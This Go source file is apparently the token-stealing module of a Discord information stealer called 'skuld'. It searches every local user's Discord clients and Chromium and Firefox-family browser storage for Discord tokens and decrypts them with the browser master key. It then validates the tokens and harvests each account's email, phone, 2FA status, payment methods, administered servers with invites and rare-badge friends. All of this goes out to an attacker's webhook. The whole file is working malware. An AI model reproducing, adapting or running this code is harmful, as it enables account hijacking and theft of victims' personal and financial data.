package tokens

import (
	"encoding/base64"
	"encoding/json"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"

	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/requests"
)

var (
	Regexp         = regexp.MustCompile(`dQw4w9WgXcQ:[^\"]*`)
	RegexpBrowsers = regexp.MustCompile(`[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}`)
)

func Run(webhook string) {
	var Tokens []string
	discordPaths := map[string]string{
		"Discord":        "\\discord\\Local State",
		"Discord Canary": "\\discordcanary\\Local State",
		"Lightcord":      "\\lightcord\\Local State",
		"Discord PTB":    "\\discordptb\\Local State",
	}

	for _, user := range hardware.GetUsers() {
		for _, path := range discordPaths {

			path = user + "\\AppData\\Roaming" + path

			if !fileutil.Exists(path) {
				continue
			}

			dir := filepath.Dir(path)
			c := browsers.Chromium{}
			err := c.GetMasterKey(dir)
			if err != nil {
				continue
			}

			var files []string
			ldbs, err := filepath.Glob(filepath.Join(dir, "Local Storage", "leveldb", "*.ldb"))
			if err != nil {
				continue
			}
			files = append(files, ldbs...)
			logs, err := filepath.Glob(filepath.Join(dir, "Local Storage", "leveldb", "*.log"))
			if err != nil {
				continue
			}
			files = append(files, logs...)

			for _, file := range files {
				data, err := fileutil.ReadFile(file)
				if err != nil {
					continue
				}

				for _, match := range Regexp.FindAllString(data, -1) {
					encodedPass, err := base64.StdEncoding.DecodeString(strings.Split(match, "dQw4w9WgXcQ:")[1])
					if err != nil {
						continue
					}
					decodedPass, err := c.Decrypt(encodedPass)
					if err != nil {
						continue
					}

					token := string(decodedPass)

					if !ValidateToken(token) {
						continue
					}

					if Contains(Tokens, token) {
						continue
					}

					Tokens = append(Tokens, token)
				}
			}
		}

		for name, path := range browsers.GetChromiumBrowsers() {
			path = user + "\\" + path

			if !fileutil.IsDir(path) {
				continue
			}

			var profiles []browsers.Profile
			if strings.Contains(path, "Opera") {
				profiles = append(profiles, browsers.Profile{
					Name:    "Default",
					Path:    path,
					Browser: browsers.Browser{Name: name},
				})
			} else {
				folders, err := os.ReadDir(path)
				if err != nil {
					continue
				}
				for _, folder := range folders {
					if folder.IsDir() {
						files, err := os.ReadDir(filepath.Join(path, folder.Name()))
						if err != nil {
							continue
						}
						for _, file := range files {
							if file.Name() == "Web Data" {
								profiles = append(profiles, browsers.Profile{
									Name:    folder.Name(),
									Path:    filepath.Join(path, folder.Name()),
									Browser: browsers.Browser{Name: "Chromium"},
								})
							}
						}
					}
				}
			}

			c := browsers.Chromium{}
			err := c.GetMasterKey(path)
			if err != nil {
				continue
			}

			for _, profile := range profiles {
				var files []string
				ldbs, err := filepath.Glob(filepath.Join(profile.Path, "Local Storage", "leveldb", "*.ldb"))
				if err != nil {
					continue
				}
				files = append(files, ldbs...)
				logs, err := filepath.Glob(filepath.Join(profile.Path, "Local Storage", "leveldb", "*.log"))
				if err != nil {
					continue
				}
				files = append(files, logs...)

				for _, file := range files {
					data, err := fileutil.ReadFile(file)
					if err != nil {
						continue
					}

					for _, token := range RegexpBrowsers.FindAllString(data, -1) {
						if !ValidateToken(token) {
							continue
						}

						if Contains(Tokens, token) {
							continue
						}

						Tokens = append(Tokens, token)

					}
				}
			}
		}

		for _, path := range browsers.GetGeckoBrowsers() {
			path = user + "\\" + path
			if !fileutil.IsDir(path) {
				continue
			}

			profiles, err := os.ReadDir(path)
			if err != nil {

				continue
			}
			for _, profile := range profiles {
				if !profile.IsDir() {
					continue
				}

				files, err := os.ReadDir(path + "\\" + profile.Name())
				if err != nil {
					continue
				}

				if len(files) <= 10 {
					continue
				}

				filepath.Walk(path+"\\"+profile.Name(), func(path string, info os.FileInfo, err error) error {
					if err != nil {
						return err
					}
					if !info.IsDir() {
						if strings.Contains(info.Name(), ".sqlite") {
							lines, err := fileutil.ReadLines(path)
							if err != nil {
								return err
							}
							for _, line := range lines {
								for _, token := range RegexpBrowsers.FindAllString(line, -1) {
									if !ValidateToken(token) {
										continue
									}

									if Contains(Tokens, token) {
										continue
									}

									Tokens = append(Tokens, token)
								}
							}
						}
					}
					return nil
				})
			}

		}

	}

	for _, token := range Tokens {
		body, err := requests.Get("https://discord.com/api/v9/users/@me", map[string]string{"Authorization": token})
		if err != nil {
			return
		}

		var user User
		err = json.Unmarshal(body, &user)
		if err != nil {
			return
		}

		billing, err := requests.Get("https://discord.com/api/v9/users/@me/billing/payment-sources", map[string]string{"Authorization": token})
		if err != nil {
			return
		}

		var billingData []Billing
		err = json.Unmarshal(billing, &billingData)
		if err != nil {
			return
		}

		guilds, err := requests.Get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", map[string]string{"Authorization": token})
		if err != nil {
			return
		}

		var guildsData []Guild
		err = json.Unmarshal(guilds, &guildsData)
		if err != nil {
			return
		}

		friends, err := requests.Get("https://discord.com/api/v9/users/@me/relationships", map[string]string{"Authorization": token})
		if err != nil {
			return
		}

		var friendsData []Friend
		err = json.Unmarshal(friends, &friendsData)
		if err != nil {
			return
		}

		var avatar string
		res, err := http.Get("https://cdn.discordapp.com/avatars/" + user.ID + "/" + user.Avatar + ".gif")
		if err != nil {
			return
		}

		if res.StatusCode != 200 {
			avatar = "https://cdn.discordapp.com/avatars/" + user.ID + "/" + user.Avatar + ".png"
		} else {
			avatar = "https://cdn.discordapp.com/avatars/" + user.ID + "/" + user.Avatar + ".gif"
		}

		_ = avatar

		badges := GetFlags(user.PublicFlags)
		nitro := GetNitro(user.PremiumType)
		paymentMethods := GetBilling(billingData)
		hq_guilds := GetHQGuilds(guildsData, token)
		hq_friends := GetHQFriends(friendsData)
		if user.Email == "" {
			user.Email = "None"
		}
		if user.Phone == "" {
			user.Phone = "None"
		}
		if user.MfaEnabled {
			user.Phone = user.Phone + " (2FA)"
		}

		embed := map[string]interface{}{
			"title": user.Username + " (" + user.ID + ")",
			"thumbnail": map[string]string{
				"url": avatar,
			},
			"fields": []map[string]interface{}{
				{
					"name":   "<a:pinkcrown:996004209667346442> Token:",
					"value":  "```" + token + "```",
					"inline": false,
				},
				{"name": "\u200b", "value": "\u200b", "inline": false},
				{
					"name":   "<:egp_mail:875383124241055845> Email:",
					"value":  "`" + user.Email + "`",
					"inline": true,
				},
				{
					"name":   "<:starxglow:996004217699434496> Phone:",
					"value":  "`" + user.Phone + "`",
					"inline": true,
				},
				{"name": "\u200b", "value": "\u200b", "inline": false},
				{
					"name":   "<a:nitroboost:996004213354139658> Nitro:",
					"value":  nitro,
					"inline": true,
				},
				{
					"name":   "💎 Badges:",
					"value":  badges,
					"inline": true,
				},
				{
					"name":   "<:purple_stars:1082566201105981440> Billing:",
					"value":  paymentMethods,
					"inline": true,
				},
			},
		}

		if hq_guilds != "" {
			embed["fields"] = append(embed["fields"].([]map[string]interface{}), map[string]interface{}{
				"name":   "\u200b",
				"value":  hq_guilds,
				"inline": false,
			})
		}

		if hq_friends != "" {
			embed["fields"] = append(embed["fields"].([]map[string]interface{}), map[string]interface{}{
				"name":   "\u200b",
				"value":  hq_friends,
				"inline": false,
			})
		}

		requests.Webhook(webhook, map[string]interface{}{
			"embeds": []map[string]interface{}{embed},
		})
	}
}

func Contains(s []string, e string) bool {
	for _, a := range s {
		encodedA := strings.Split(a, ".")[0]
		encodedE := strings.Split(e, ".")[0]

		decodedA, err := base64.RawStdEncoding.DecodeString(encodedA)
		if err != nil {
			continue
		}
		decodedE, err := base64.RawStdEncoding.DecodeString(encodedE)
		if err != nil {
			continue
		}

		if string(decodedA) == string(decodedE) {
			return true
		}
	}
	return false
}

func ValidateToken(token string) bool {
	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me", nil)
	req.Header.Set("Authorization", token)
	if err != nil {
		return false
	}

	res, err := http.DefaultClient.Do(req)
	if err != nil {
		return false
	}

	return res.StatusCode == 200
}

func GetHQFriends(friends []Friend) (hqFriends string) {
	for _, friend := range friends {
		flags := GetRareFlags(friend.User.PublicFlags)
		if flags == "" {
			continue
		}
		if hqFriends == "" {
			hqFriends = "**Rare Friends:**\n"
		}
		hqFriends += flags + " - `" + friend.User.Username + "#" + " (" + friend.User.ID + ")`\n"

		if len(hqFriends) >= 1024 {
			return "Too many friends to display."
		}
	}
	return hqFriends
}

func GetHQGuilds(guilds []Guild, token string) (hqGuilds string) {
	for _, guild := range guilds {
		if guild.Permissions != "562949953421311" {
			continue
		}
		if hqGuilds == "" {
			hqGuilds = "**Rare Servers:**\n"
		}

		res, err := requests.Get("https://discord.com/api/v8/guilds/"+guild.ID+"/invites", map[string]string{"Authorization": token})
		if err != nil {
			continue
		}

		var invites []Invite
		err = json.Unmarshal(res, &invites)
		if err != nil {
			continue
		}

		var invite string
		if len(invites) > 0 {
			invite = "[Join Server](https://discord.gg/" + invites[0].Code + ")"
		} else {
			invite = "No Invite"
		}

		if guild.Owner {
			hqGuilds += "<:SA_Owner:991312415352430673> Owner | `" + guild.Name + "` - Members: `" + strconv.Itoa(guild.ApproximateMemberCount) + "` - " + invite + "\n"
		} else {
			hqGuilds += "<:admin:967851956930482206> Admin | `" + guild.Name + "` - Members: `" + strconv.Itoa(guild.ApproximateMemberCount) + "` - " + invite + "\n"
		}

		if len(hqGuilds) >= 1024 {
			return "Too many servers to display."
		}
	}

	return hqGuilds
}

func GetBilling(billing []Billing) (paymentMethods string) {
	for _, method := range billing {
		if method.Type == 1 {
			paymentMethods += "💳"
		} else if method.Type == 2 {
			paymentMethods += "<:paypal:973417655627288666>"
		} else {
			paymentMethods += "❓"
		}
	}
	if paymentMethods == "" {
		paymentMethods = "`None`"
	}

	return paymentMethods
}

func GetNitro(flags int) string {
	switch flags {
	case 1:
		return "`Nitro Classic`"
	case 2:
		return "`Nitro`"
	case 3:
		return "`Nitro Basic`"
	default:
		return "`None`"
	}
}

func GetFlags(flags int) string {
	flagsDict := map[string]int{
		"<:8485discordemployee:1163172252989259898>":           0,
		"<:9928discordpartnerbadge:1163172304155586570>":       1,
		"<:9171hypesquadevents:1163172248140660839>":           2,
		"<:4744bughunterbadgediscord:1163172239970140383>":     3,
		"<:6601hypesquadbravery:1163172246492287017>":          6,
		"<:6936hypesquadbrilliance:1163172244474822746>":       7,
		"<:5242hypesquadbalance:1163172243417858128>":          8,
		"<:5053earlysupporter:1163172241996005416>":            9,
		"<:1757bugbusterbadgediscord:1163172238942543892>":     14,
		"<:1207iconearlybotdeveloper:1163172236807639143>":     17,
		"<:1207iconactivedeveloper:1163172534443851868>":       22,
		"<:4149blurplecertifiedmoderator:1163172255489085481>": 18,
		"⌨️": 20,
	}

	var result string
	for emoji, shift := range flagsDict {
		if int(flags)&(1<<shift) != 0 {
			result += emoji
		}
	}

	if result == "" {
		result = "`None`"
	}

	return result
}

func GetRareFlags(flags int) string {
	flagsDict := map[string]int{
		"<:8485discordemployee:1163172252989259898>":           0,
		"<:9928discordpartnerbadge:1163172304155586570>":       1,
		"<:9171hypesquadevents:1163172248140660839>":           2,
		"<:4744bughunterbadgediscord:1163172239970140383>":     3,
		"<:5053earlysupporter:1163172241996005416>":            9,
		"<:1757bugbusterbadgediscord:1163172238942543892>":     14,
		"<:1207iconearlybotdeveloper:1163172236807639143>":     17,
		"<:4149blurplecertifiedmoderator:1163172255489085481>": 18,
	}

	var result string
	for emoji, shift := range flagsDict {
		if int(flags)&(1<<shift) != 0 {
			result += emoji
		}
	}

	return result
}
